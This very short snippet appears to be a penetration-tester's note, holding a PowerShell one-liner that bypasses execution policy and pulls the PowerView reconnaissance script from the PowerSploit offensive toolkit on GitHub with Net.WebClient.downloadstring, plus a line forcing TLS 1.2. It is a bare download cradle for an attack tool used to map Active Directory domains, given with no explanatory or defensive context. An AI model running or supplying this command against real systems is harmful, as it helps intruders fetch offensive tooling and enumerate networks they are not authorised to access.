powershell.exe -exec Bypass -C (New-Object Net.Webclient).downloadstring("https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1")


[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
